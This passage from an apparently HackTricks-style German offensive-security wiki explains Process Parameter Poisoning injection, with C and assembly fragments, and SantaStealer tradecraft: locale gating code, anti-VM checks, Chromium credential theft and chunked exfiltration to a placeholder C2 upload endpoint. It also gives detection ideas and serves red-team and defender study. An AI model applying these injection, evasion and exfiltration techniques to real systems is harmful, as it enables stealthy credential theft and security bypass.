- Große Implants erfordern häufig, die Einbettung des Shellcodes von einem String-Literal in einen **Byte-Array/Braced-Initializer** zu ändern, damit der vollständige Buffer im Injector-Quellcode korrekt dargestellt wird.

Erkennungsideen
- Remote-Schreibvorgänge in **ausführbare, Image-basierte Speicherseiten** (`MEM_IMAGE`, `PAGE_EXECUTE*`) statt in die häufiger vorkommenden privaten RWX/RX-Allokationen.
- Export-Einstiegspunkte, deren Bytes im Speicher nicht mehr mit der zugrunde liegenden Datei auf der Festplatte übereinstimmen.
- Remote-Threads oder Context-Pivots, die ihre Ausführung innerhalb eines legitimen DLL-Exports beginnen, dessen erste Bytes kürzlich geändert wurden.
- Verdächtige Sequenzen aus `VirtualProtect(Ex)` / `WriteProcessMemory` gegen DLL-`.text`-Seiten, gefolgt von der Thread-Erstellung.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) ist eine **Process-Injection-/EDR-Evasion**-Technik, die den klassischen Remote-Schreibpfad (`VirtualAllocEx` + `WriteProcessMemory`) vermeidet. Anstatt Bytes in ein bereits laufendes Ziel zu kopieren, nutzt sie die Tatsache aus, dass Windows ausgewählte `CreateProcessW`-Startparameter in den Child-Prozess **kopiert** und sie innerhalb von `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`) speichert.<sup>[[28]](#references)[[29]](#references)</sup>

### Durch `CreateProcessW` kopierbare Träger

Nützliche Träger sind:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (mit `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Praktische Einschränkungen der Träger:

- `lpCommandLine` muss für `CreateProcessW` auf beschreibbaren Speicher zeigen und ist auf **32.767 Unicode-Zeichen** einschließlich des Null-Terminators begrenzt.
- `lpEnvironment` muss ein Unicode-Environment-Block aus aufeinanderfolgenden `NAME=VALUE\0`-Strings sein, der mit einem zusätzlichen `\0` endet.
- `lpReserved` ist offiziell reserviert, daher sollte das `ShellInfo`-Mapping eher als Implementierungsdetail und nicht als stabiler dokumentierter Vertrag betrachtet werden.

Dadurch wird die normale Prozesserstellung zum **Payload-Transfer-Primitiv**. Der Operator erstellt den Child-Prozess mit von ihm kontrollierten Startdaten und überlässt Windows das Cross-Process-Kopieren.

### Remote-Lookup-Ablauf ohne Remote-Write-APIs

Nachdem der Child-Prozess erstellt wurde, wird der kopierte Buffer mit **Nur-Lese**-Primitiven aufgelöst:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → `PROCESS_BASIC_INFORMATION.PebBaseAddress` abrufen
2. Den Remote-`PEB` lesen
3. `PEB.ProcessParameters` folgen
4. `RTL_USER_PROCESS_PARAMETERS` lesen
5. Den ausgewählten Pointer verwenden:
- `parameters.CommandLine.Buffer`
- `parameters.Environment`
- `parameters.ShellInfo.Buffer`

Minimaler Ablauf:
```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```
### Ausführen des kopierten Parameterpuffers

Die kopierte Parameterregion ist normalerweise `RW` und nicht ausführbar. Eine häufige P3 chain besteht aus:

1. Den Prozess normal erstellen (nicht angehalten)
2. Die ausgewählte Parameterseite mit `NtProtectVirtualMemory` / `VirtualProtectEx` ausführbar machen
3. Das bereits in `PROCESS_INFORMATION` zurückgegebene Handle des Main Threads wiederverwenden
4. Die Ausführung mit `NtSetContextThread` umleiten (`CONTEXT_CONTROL`, `RIP` überschreiben)

Im Gegensatz zu klassischen Thread-Hijacking-Workflows erfordert dies **nicht** `SuspendThread` / `ResumeThread`; der Context kann direkt über das zurückgegebene Handle des Main Threads geändert werden.

Dadurch werden mehrere APIs vermieden, die häufig auf Injection überwacht werden:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- häufig auch `SuspendThread` / `ResumeThread`

### Einschränkung durch Null-Bytes und gestuftes Shellcode

Alle drei Träger sind **String- oder String-ähnliche Daten**, daher wird ein Raw Payload, das `0x00` enthält, während der Übertragung abgeschnitten. Eine praktische Umgehung ist eine **nullfreie erste Stage**, die Constants zur Laufzeit rekonstruiert und anschließend eine beliebige zweite Stage lädt.

Ein einfaches Muster ist die XOR-basierte Synthese von Constants:
```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```
Dies ermöglicht es der ersten Stage, Stack-Strings, API-Argumente, DLL-Pfade oder einen Shellcode-Loader für eine zweite Stage zu erstellen, ohne Nullbytes in den übertragenen Parameter einzubetten.

### Stack-based API calls from the first stage

Wenn die erste Stage APIs wie `LoadLibraryA` aufrufen muss, kann sie:

- den String/Buffer auf den Stack des Ziels pushen
- den **32-byte x64 shadow space** reservieren
- `RCX`, `RDX`, `R8`, `R9` auf Konstanten oder `RSP`-relative Zeiger setzen
- `RSP` vor dem Aufruf **16-byte aligned** halten

Eine zweite Stage kann anschließend vom Stack in eine `PAGE_READWRITE`-Allocation kopiert, mit `VirtualProtect` auf `PAGE_EXECUTE_READ` gesetzt und angesprungen werden, wodurch eine direkte RWX-Allocation vermieden wird.

### Detection ideas

Gute Hunting-Möglichkeiten, die von den Autoren erwähnt wurden:

- `VirtualProtectEx` / `NtProtectVirtualMemory`, die **process-parameter pages executable** machen
- diese Änderung der Protection, gefolgt von `SetThreadContext` / `NtSetContextThread`
- Remote-Lesezugriffe auf `PEB` und anschließend auf `RTL_USER_PROCESS_PARAMETERS`
- ungewöhnlich lange oder entropiereiche Werte für `lpCommandLine`, `lpEnvironment` oder `STARTUPINFO.lpReserved` während der Prozesserstellung

### Notes

- P3 ist ein **cross-process transfer trick** und für sich genommen keine vollständige Execution Primitive: Der kopierte Parameter benötigt weiterhin eine Änderung der Execute-Berechtigung sowie eine Methode zur Umleitung der Ausführung.
- `RtlCreateProcessReflection` / Dirty Vanity wurde von den Autoren in Betracht gezogen, jedoch verworfen, da intern verdächtige Primitives wie `NtWriteVirtualMemory` und `NtCreateThreadEx` erreicht werden.

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (auch BluelineStealer genannt) veranschaulicht, wie moderne Info-Stealer AV bypass, Anti-Analysis und Credential Access in einem einzigen Workflow kombinieren.<sup>[[24]](#references)</sup>

### Keyboard layout gating & sandbox delay

- Ein Config-Flag (`anti_cis`) listet installierte Keyboard-Layouts über `GetKeyboardLayoutList` auf. Wird ein kyrillisches Layout gefunden, legt das Sample einen leeren `CIS`-Marker ab und beendet sich, bevor es Stealer ausführt. Dadurch wird sichergestellt, dass es in ausgeschlossenen Locales niemals detoniert, während gleichzeitig ein Hunting-Artefakt zurückbleibt.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Layered-`check_antivm`-Logik

- Variante A durchläuft die Prozessliste, hasht jeden Namen mit einer benutzerdefinierten Rolling-Checksumme und vergleicht sie mit eingebetteten Blocklists für Debugger/Sandboxes. Anschließend wiederholt sie die Prüfsumme für den Computernamen und überprüft Arbeitsverzeichnisse wie `C:\analysis`.
- Variante B untersucht Systemeigenschaften (Mindestanzahl von Prozessen, letzte Betriebszeit), ruft `OpenServiceA("VBoxGuest")` auf, um VirtualBox Additions zu erkennen, und führt Timing-Prüfungen rund um Sleeps durch, um Single-Stepping zu erkennen. Jeder Treffer bricht die Ausführung ab, bevor Module gestartet werden.

### Fileless Helper + doppeltes ChaCha20-Reflective-Loading

- Die primäre DLL/EXE enthält einen Chromium-Credential-Helper, der entweder auf die Festplatte geschrieben oder manuell in den Speicher gemappt wird. Im Fileless-Modus löst er Imports/Relocations selbst auf, sodass keine Helper-Artefakte geschrieben werden.
- Dieser Helper speichert eine Second-Stage-DLL, die zweimal mit ChaCha20 verschlüsselt ist (zwei 32-Byte-Schlüssel + 12-Byte-Nonces). Nach beiden Durchläufen lädt er das Blob reflectively (ohne `LoadLibrary`) und ruft die Exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` auf, die von [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) abgeleitet sind.<sup>[[25]](#references)</sup>
- Die ChromElevator-Routinen verwenden Reflective Process Hollowing über Direct Syscalls, um in einen laufenden Chromium-Browser zu injizieren, AppBound-Encryption-Schlüssel zu übernehmen und Passwörter/Cookies/Kreditkarten direkt aus SQLite-Datenbanken zu entschlüsseln, trotz der ABE-Härtung.


### Modulare In-Memory-Sammlung & chunked HTTP-Exfiltration

- `create_memory_based_log` iteriert über eine globale `memory_generators`-Function-Pointer-Tabelle und startet für jedes aktivierte Modul (Telegram, Discord, Steam, Screenshots, Dokumente, Browser-Erweiterungen usw.) einen Thread. Jeder Thread schreibt Ergebnisse in gemeinsam genutzte Buffer und meldet seine Dateianzahl nach einem Join-Fenster von etwa 45 Sekunden.
- Nach Abschluss wird alles mit der statisch gelinkten `miniz`-Bibliothek als `%TEMP%\\Log.zip` gezippt. `ThreadPayload1` wartet anschließend 15 Sekunden und streamt das Archiv in 10-MB-Chunks per HTTP POST an `http://<C2>:6767/upload`, wobei eine Browser-`multipart/form-data`-Boundary (`----WebKitFormBoundary***`) vorgetäuscht wird. Jeder Chunk fügt `User-Agent: upload`, `auth: <build_id>` und optional `w: <campaign_tag>` hinzu; der letzte Chunk hängt `complete: true` an, damit das C2 weiß, dass die Wiederzusammensetzung abgeschlossen ist.

## References

- [1] [Fortgeschrittene Evasion-Techniken: Präzises Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – Blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call Stacks, keine kostenlosen Durchläufe mehr für Malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – Dokumentation](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – Beispiel](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – Beispiel](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC für Call-Stack-Spoofing](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Neue Infektionskette und ConfuserEx-basierte Obfuskation für DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Sollte man seinem Zero Trust vertrauen? Umgehung von Zscaler-Posture-Checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Vor ToolShell: Untersuchung der früheren Ransomware-Operationen von Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Missbrauch weitergeleiteter Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Inventar weitergeleiteter Exports von Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Suchreihenfolge für Dynamic-Link-Libraries](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Prozesssicherheit und Zugriffsrechte](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU-Referenz (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL-Launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – EDRs mit Unterstützung von Protected Process Light (PPL) bekämpfen](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Die Schutzschale von Windows Defender mit der Folder-Redirect-Technik durchbrechen](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Referenz zum mklink-Befehl](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Unter dem Pure Curtain: Vom RAT über den Builder zum Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer kommt in die Stadt: Ein neuer, ambitionierter Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Entschlüsselung der Chrome App-Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Node.js-Malware mit API-Tracing besiegen](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Adaptix mit Crystal Palace zur Ruhe legen](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET und Stack-Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko-Sleep-Obfuskation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com – Dein Dotnet ETW verbergen](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com – Chrome Remote Desktop bei Red-Team-Operationen missbrauchen: Ein praktischer Leitfaden](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research – BTR Reforged: Den Remediation-Treiber von Defender als Kernel-Operationsprimitive einsetzen](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY – BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
{{#include ../banners/hacktricks-training.md}}
